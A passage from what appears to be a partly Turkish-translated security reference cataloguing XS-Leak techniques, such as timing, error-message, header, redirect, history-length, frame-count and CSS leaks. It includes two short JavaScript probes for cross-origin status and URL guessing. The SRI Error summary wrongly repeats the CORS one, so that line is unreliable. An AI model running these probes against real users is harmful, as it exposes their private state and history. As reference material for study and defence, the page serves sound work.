### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Redirect
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Redirect oluştuğunda timing entry'lerinin duration'ı negatif olur.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

In GC, the **duration** for requests that result in a **redirect** is **negative** and can thus be **distinguished** from requests that do not result in a redirect.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Header
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** CORP ile korunan kaynaklar resource timing entry oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

In some cases, the **nextHopProtocol entry** can be used as a leak technique. In GC, when the **CORP header** is set, the nextHopProtocol will be **empty**. Note that SA will not create a performance entry at all for CORP-enabled resources.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Usage
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Belirli bir origin için service worker kayıtlı olup olmadığını tespit edin.
- **Code Example**:

Service workers are event-driven script contexts that run at an origin. They run in the background of a web page and can intercept, modify, and **cache resources** to create offline web application.\
If a **resource cached** by a **service worker** is accessed via **iframe**, the resource will be **loaded from the service worker cache**.\
To detect if the resource was **loaded from the service worker** cache the **Performance API** can be used.\
This could also be done with a Timing attack (check the paper for more info).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Bir kaynağın cache'te saklanıp saklanmadığını kontrol etmek mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

Using the [Performance API](#performance-api) it's possible to check if a resource is cached.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** `performance` API'den bir isteğin network süresini almak mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Status Code
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Firefox'ta cross-origin isteğin status code'unu doğru şekilde leak etmek mümkündür.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
The `MediaError` interface's `message` property, başarılı şekilde yüklenen kaynakları benzersiz bir dizeyle tanımlar. Bir saldırgan bu özelliği, mesaj içeriğini gözlemleyerek kullanabilir ve böylece cross-origin bir kaynağın yanıt durumunu çıkarabilir.

### CORS Error

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Security Assertions (SA) içinde, CORS hata mesajları istemeden yönlendirilmiş isteklerin tam URL'sini açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, Webkit tabanlı tarayıcıların CORS isteklerini nasıl ele aldığı üzerinden bir saldırganın **cross-origin sitenin yönlendirme hedefini çıkarmasına** olanak tanır. Özellikle, bir hedef siteye kullanıcı durumuna bağlı olarak yönlendirme yapan ve tarayıcının isteği reddettiği durumda, **yönlendirmenin hedefinin tam URL'si** hata mesajı içinde ifşa edilir. Bu zayıflık yalnızca yönlendirmenin olduğunu açığa çıkarmakla kalmaz, aynı zamanda yönlendirmenin uç noktasını ve içerebileceği **hassas sorgu parametrelerini** de ifşa eder.

### SRI Error

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Security Assertions (SA) içinde, CORS hata mesajları istemeden yönlendirilmiş isteklerin tam URL'sini açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Saldırganlar, **ayrıntılı hata mesajlarını** kullanarak cross-origin yanıtların boyutunu çıkarabilirler. Bu, Subresource Integrity (SRI) mekanizmasının çalışma şekli nedeniyle mümkündür; SRI, integrity özniteliğini kullanarak genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrular. SRI'nin cross-origin kaynaklarda çalışabilmesi için bu kaynakların **CORS-enabled** olması gerekir; aksi halde integrity kontrollerine tabi olmazlar. Security Assertions (SA) içinde, tıpkı CORS error XS-Leak vakasında olduğu gibi, integrity özniteliğiyle başarısız olan bir fetch isteğinden sonra bir hata mesajı yakalanabilir. Saldırganlar bu hatayı tetiklemek için herhangi bir isteğe **geçersiz bir hash değeri** atayabilirler. SA'da ortaya çıkan hata mesajı, istenen kaynağın içerik uzunluğunu istemeden açığa çıkarır. Bu bilgi sızıntısı, saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine ve sofistike XS-Leak saldırılarına zemin hazırlamasına izin verir.

### CSP Violation/Detection

- **Dahil Etme Yöntemleri**: Pop-ups
- **Tespit Edilebilir Fark**: Status Code
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Özet:** Saldırganın sitesinde yalnızca hedef (victim) sitesi izin veriliyorsa ve bu site farklı bir domaine yönlendirmeye çalışırsa, CSP tespit edilebilir bir hata tetikler.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak cross-origin bir sitenin farklı bir origin'e yönlendirildiğini tespit edebilir. Bu leak yönlendirmeyi tespit edebildiği gibi, yönlendirme hedefinin domain'ini de açığa çıkarır. Saldırının temel fikri, hedef domaini saldırgan sitesinde izin vermektir. Hedef domaine bir istek yapıldığında, bu istek bir cross-origin domaine **redirect** olursa, **CSP erişimi engeller** ve bunu bir **violation report** olarak ortaya çıkarır; bu rapor leak tekniği olarak kullanılabilir. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef lokasyonunu açığa çıkarabilir**. Modern tarayıcılar genellikle yönlendirilen URL'yi belirtmez, ancak yine de bir cross-origin yönlendirmenin tetiklendiğini tespit edebilirsiniz.

### Cache

- **Dahil Etme Yöntemleri**: Frames, Pop-ups
- **Tespit Edilebilir Fark**: Page Content
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Özet:** Dosyayı önbellekten temizle. Hedef sayfayı aç ve dosyanın önbellekte olup olmadığını kontrol et.
- **Kod Örneği:**

Tarayıcılar tüm web siteleri için ortak bir önbellek kullanıyor olabilir. Kaynakların origin'inden bağımsız olarak, hedef sayfanın belirli bir dosyayı **isteyip istemediğini** çıkarmak mümkündür.

Bir sayfa sadece kullanıcı girişliyse bir resmi yüklüyorsa, kaynağı **geçersiz kılabilir** (yani önbellekten kaldırabilirsiniz, ayrıntılar için bağlantılara bakın), sonra o kaynağı yükleyebilecek bir istek yapıp kaynağı **kötü bir istekle** (ör. aşırı uzun referer header kullanarak) yüklemeyi deneyebilirsiniz. Eğer kaynak yüklemesi **herhangi bir hata tetiklemediyse**, bu kaynağın **önbellekte olduğu** içindir.

### CSP Directive

- **Dahil Etme Yöntemleri**: Frames
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Özet:** CSP header yönergeleri, iframe'in CSP attribute'u kullanılarak test edilebilir ve politika detaylarını açığa çıkarabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir özellik, iframe elementine bir attribute setleyerek bir Content Security Policy (CSP) önermeye izin verir; politika yönergeleri HTTP isteğiyle birlikte iletilir. Normalde gömülü içerik bunun HTTP header ile yetkilendirilmesini sağlamalıdır, aksi halde bir **hata sayfası gösterilir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenir. Bu mekanizma, saldırganın cross-origin bir sayfanın belirli CSP yönergelerini **hata sayfasını tespit ederek** keşfetmesine olanak tanır. Bu zafiyet düzeltilmiş olarak işaretlenmiş olsa da, bulgularımız hata sayfasını tespit edebilen yeni bir leak tekniğinin varlığını ortaya koyuyor; bu da temel sorunun tam olarak çözülmediğini gösteriyor.

### **CORP**

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Özet:** Cross-Origin Resource Policy (CORP) ile korunan kaynaklar, izin verilmeyen origin'den fetch edildiğinde bir hata fırlatır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP header, ayarlandığında verilen kaynağa yapılan no-cors cross-origin isteklerini **engelleyen** nispeten yeni bir web platformu güvenlik özelliğidir. Header'ın varlığı tespit edilebilir, çünkü CORP ile korunan bir kaynak fetch edildiğinde **hata fırlatır**.

### CORB

- **Dahil Etme Yöntemleri**: HTML Elements
- **Tespit Edilebilir Fark**: Headers
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Özet**: CORB, saldırganların istekte `nosniff` header'ının var olup olmadığını tespit etmesine olanak sağlayabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırıyı daha fazla öğrenmek için bağlantıyı kontrol edin.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Headers
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Özet**: Eğer Origin header `Access-Control-Allow-Origin` header'ında yansıtılıyorsa, bir kaynağın zaten önbellekte olup olmadığını kontrol etmek mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin header** `Access-Control-Allow-Origin` header'ında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak kaynağı **CORS** modunda **fetch** etmeyi deneyebilir. Eğer bir **hata** **tetiklenmezse**, bu kaynağın **doğru şekilde web'den alındığı** anlamına gelir; eğer bir hata **tetiklenirse**, bunun nedeni kaynağın **önbellekten erişilmiş** olmasıdır (hata ortaya çıkar çünkü önbellek, orijinal domain'e izin veren bir CORS header'ı içeren bir yanıtı kaydetmiştir ve saldırganın domain'i için izin vermez).\
Not: Eğer origin yansıtılmıyorsa fakat wildcard kullanılıyorsa (`Access-Control-Allow-Origin: *`) bu yöntem işe yaramaz.

## Readable Attributes Technique

### Fetch Redirect

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Status Code
- **Daha fazla bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın `type`'ını (opaque-redirect) kontrol etmeye izin verir.
- **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek gönderildiğinde, `response.type` özniteliğini okumak mümkündür; eğer bu `opaqueredirect` ise yanıtın bir yönlendirme olduğu anlaşılır.

### COOP

- **Dahil Etme Yöntemleri**: Pop-ups
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Özet:** Cross-Origin Opener Policy (COOP) ile korunan sayfalar, cross-origin etkileşimlerden erişimi engeller.
- **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, cross-origin HTTP yanıtında Cross-Origin Opener Policy (COOP) header'ının varlığını çıkarabilir. COOP, web uygulamalarının dış sitelerin rasgele window referansları almasını önlemek için kullanılır. Bu header'ın görünürlüğü, **`contentWindow` referansına** erişmeyi deneyerek anlaşılabilir. COOP koşullu olarak uygulandığında, **`opener` property** belirgin bir gösterge olur: COOP etkinse **undefined**, yoksa **tanımlı**dır.

### URL Max Length - Server Side

- **Dahil Etme Yöntemleri**: Fetch API, HTML Elements
- **Tespit Edilebilir Fark**: Status Code / Content
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Özet:** Yönlendirme yanıtının uzunluğu nedeniyle sunucunun hata döndürmesi sonucu oluşan farklar tespit edilebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer sunucu taraflı bir yönlendirme, yönlendirmede **kullanıcı girdisini** ve ek veri kullanıyorsa, bu davranış tespit edilebilir çünkü genellikle **sunucuların bir istek uzunluğu limiti** vardır. Eğer **kullanıcı verisi** bu limitin bir eksiği kadarsa ve yönlendirme bu veriyi kullanıp üzerine ekstra bir şey ekliyorsa, bu bir **hata**yı tetikler ve bu hata **Error Events** aracılığıyla tespit edilebilir.

Bir kullanıcıya çerez ayarlayabiliyorsanız, bu saldırıyı **yeterli sayıda çerez ayarlayarak** da gerçekleştirebilirsiniz ([**cookie bomb**](../hacking-with-cookies/cookie-bomb.md)); böylece **doğru yanıtın boyutu artar** ve bir **hata** tetiklenir. Bu durumda, isteği aynı siteden tetiklerseniz `<script>` otomatik olarak çerezleri gönderir (yani hataları kontrol edebilirsiniz).\
**cookie bomb + XS-Search** örneği için bu writeup'ın Intended solution kısmına bakın: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tür bir saldırı için genellikle `SameSite=None` veya aynı konteks içinde olmak gerekir.

### URL Max Length - Client Side

- **Dahil Etme Yöntemleri**: Pop-ups
- **Tespit Edilebilir Fark**: Status Code / Content
- **Daha fazla bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Özet:** Redirect URL'sinin uzunluğu nedeniyle oluşabilecek farklar tespit edilebilir.
- **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'tır.

> Genel olarak, web platformunun URL uzunluğu konusunda sınırlamaları yoktur (buna rağmen 2^31 yaygın bir limittir). Chrome, pratik nedenlerle ve inter-process iletişimde hizmet reddine yol açmamak için URL'leri maksimum **2MB** ile sınırlar.

Dolayısıyla eğer **yönlendirme URL'si bir durumda daha büyükse**, yönlendirmenin **2MB'den büyük bir URL** ile yapılmasını sağlayarak limit çarpışması yaratılabilir. Bu olduğunda, Chrome bir **`about:blank#blocked`** sayfası gösterir.

Fark edilebilir olan nokta şudur: eğer **yönlendirme tamamlanmışsa**, `window.origin` bir **hata** fırlatır çünkü cross-origin bilgiye erişilemez. Ancak, limit aşılıp yüklene sayfa **`about:blank#blocked`** ise pencerenin **`origin`** değeri ebeveynin origin'i olarak kalır ve bu erişilebilir bir bilgidir.

Gerekli ekstra bilgiyi 2MB'ye ulaşmak için ilk URL'de bir **hash** ekleyerek sağlayabilirsiniz; böylece bu veri **yönlendirmede kullanılacaktır**.


{{#ref}}
url-max-length-client-side.md
{{#endref}}

### Max Redirects

- **Dahil Etme Yöntemleri**: Fetch API, Frames
- **Tespit Edilebilir Fark**: Status Code
- **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Özet:** Tarayıcının maksimum yönlendirme sınırını kullanarak URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirleyin.
- **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının takip edebileceği **maksimum** yönlendirme sayısı **20** ise, bir saldırgan sayfasını **19 yönlendirme** ile yüklemeyi deneyip son olarak mağduru test edilecek sayfaya gönderebilir. Eğer bir **hata** tetiklenirse, o sayfanın mağduru **yönlendirmeye çalıştığı** anlaşılır.

### History Length

- **Dahil Etme Yöntemleri**: Frames, Pop-ups
- **Tespit Edilebilir Fark**: Redirects
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Özet:** JavaScript kodu tarayıcı geçmişini manipüle eder ve `length` özelliği ile erişilebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

History API, JavaScript kodunun tarayıcı geçmişini manipüle etmesine izin verir; bu geçmiş kullanıcı tarafından ziyaret edilen sayfaları kaydeder. Bir saldırgan inclusion method olarak `length` özelliğini kullanabilir: JavaScript ve HTML navigasyonunu tespit etmek için `history.length` kontrol edilir, kullanıcı bir sayfaya yönlendirilir, aynı-origin'e geri döndürülür ve yeni `history.length` değeri kontrol edilir.

### History Length with same URL

- **Dahil Etme Yöntemleri**: Frames, Pop-ups
- **Tespit Edilebilir Fark**: If URL is the same as the guessed one
- **Özet:** History length'ı kötüye kullanarak bir frame/pop-up konumunun belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
- **Kod Örneği**: Below

Bir saldırgan JavaScript ile frame/pop-up konumunu bir tahmin edilen URL'ye ayarlayıp **hemen** `about:blank` olarak değiştirebilir. Eğer history length artmışsa, bu URL'nin doğru olduğu ve aynı URL olduğundan yeniden yüklenmediği için history'nin arttığı anlamına gelir. Eğer artmadıysa, bu tahmin edilen URL'nin yüklenmeye çalışıldığı fakat hemen ardından `about:blank` yüklendiği ve bu nedenle history length'ın tahmin edilen URL için hiç artmadığı anlamına gelir.
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
await new Promise((r) => setTimeout(r, 500))
return win.history.length
}

win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=c"))

win.close()
win = window.open("https://example.com/?a=b")
await new Promise((r) => setTimeout(r, 2000))
console.log(await debug(win, "https://example.com/?a=b"))
```
### Frame Sayımı

- **Inclusion Methods**: Frames, Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
- **Summary:** Evaluate the quantity of iframe elements by inspecting the `window.length` property.
- **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

`iframe` veya `window.open` ile açılan bir web sayfasındaki frame`lerin sayısını saymak, kullanıcının o sayfadaki durumunu belirlemeye yardımcı olabilir.\
Ayrıca, sayfa her zaman aynı sayıda frame içeriyorsa, frame sayısını **sürekli** kontrol etmek bir **pattern** (örüntü) tespit etmeye ve bu pattern üzerinden bilgi sızdırmaya yardımcı olabilir.

Bu tekniğe bir örnek olarak, Chrome’da bir **PDF** içeriğinin `embed` kullanılarak içsel olarak yerleştirilmesi sebebiyle **frame sayımı** ile tespit edilebilmesi gösterilebilir. `zoom`, `view`, `page`, `toolbar` gibi içeriğin kontrolüne izin veren [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) parametreleri olduğu için bu teknik ilginç olabilir.

### HTMLElements

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
- **Summary:** Read the leaked value to distinguish between 2 possible states
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

HTML elementleri yoluyla bilgi sızıntısı web güvenliği açısından önemlidir; özellikle dinamik medya dosyaları kullanıcı bilgilerine göre üretiliyorsa veya watermark gibi eklemeler medya boyutunu değiştiriyorsa. Saldırganlar, belirli HTML elementlerinin açığa çıkardığı bilgileri analiz ederek olası durumları ayırt etmek için bunu kullanabilir.

### HTML Elementleri Tarafından Açığa Çıkan Bilgiler

- **HTMLMediaElement**: Bu element, medyanın `duration` ve `buffered` zamanlarını API üzerinden açığa çıkarır. [Read more about HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: `videoHeight` ve `videoWidth` değerlerini açığa çıkarır. Bazı tarayıcılarda `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` ve `webkitDecodedFrameCount` gibi ek özellikler de bulunur; bu da medya içeriği hakkında daha ayrıntılı bilgi sunar. [Read more about HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: `totalVideoFrames` dahil olmak üzere video oynatma kalitesi hakkında bilgiler sağlar; bu, işlenen video verisinin miktarını gösterebilir. [Read more about getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Bir resmin `height` ve `width` değerlerini sızdırır. Ancak, bir resim geçersizse bu özellikler 0 döner ve `image.decode()` fonksiyonu reddedilir; bu da resmin doğru şekilde yüklenemediğini gösterir. [Read more about HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
- **Summary:** Identify variations in website styling that correlate with the user's state or status.
- **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Web uygulamaları, kullanıcının durumuna bağlı olarak website stilini değiştirebilir. Cross-origin CSS dosyaları saldırgan sayfasına **HTML link element** ile eklenebilir ve kurallar saldırgan sayfasına **uygulanır**. Eğer bir sayfa bu kuralları dinamik olarak değiştiriyorsa, saldırgan bu farkları kullanıcı durumuna bağlı olarak **detect** edebilir.\
Bir leak tekniği olarak saldırgan, belirli bir HTML elementinin CSS özelliklerini okumak için `window.getComputedStyle` metodunu kullanabilir. Sonuç olarak, etkilenen element ve özellik adı biliniyorsa saldırgan rastgele CSS özelliklerini okuyabilir.

### CSS History

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
- **Summary:** Detect if the `:visited` style is applied to an URL indicating it was already visited
- **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

> [!TIP]
> According to [**this**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), this is not working in headless Chrome.

CSS `:visited` seçicisi, bir URL daha önce ziyaret edilmişse onu farklı şekilde stilize etmek için kullanılır. Geçmişte `getComputedStyle()` metodu bu stil farklarını tespit etmek için kullanılabiliyordu. Ancak modern tarayıcılar, bu yöntemin bir linkin durumunu açığa çıkarmasını önlemek için güvenlik önlemleri uyguladı. Bu önlemler arasında, computed style'ın her zaman link ziyaret edilmiş gibi döndürülmesi ve `:visited` ile uygulanabilecek stillerin kısıtlanması yer alır.

Bu sınırlamalara rağmen, bir linkin ziyaret edilip edilmediği dolaylı yollardan belirlenebilir. Bir teknik, kullanıcıyı CSS'ten etkilenen bir alanla etkileşime sokmak ve özellikle `mix-blend-mode` özelliğini kullanmaktır. Bu özellik, elementlerin arka planlarıyla karışmasını sağlar ve kullanıcı etkileşimine bağlı olarak ziyaret edilmiş durumunu açığa çıkarabilir.

Ayrıca, kullanıcı etkileşimi olmadan tespit, linklerin render zamanlamalarından yararlanılarak gerçekleştirilebilir. Tarayıcılar ziyaret edilmiş ve edilmemiş linkleri farklı şekilde render edebildiği için bu, render süresinde ölçülebilir bir zaman farkı oluşturabilir. Bir Chromium bug raporunda bu tekniğin bir PoC'u, zaman farkını güçlendirmek için birden fazla link kullanılarak gösterilmiştir; böylece ziyaret durumu zamanlama analiziyle tespit edilebilir hale gelir.

Daha fazla ayrıntı için bu özelliklerin dokümantasyon sayfalarını ziyaret edin:

- `:visited`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Headers
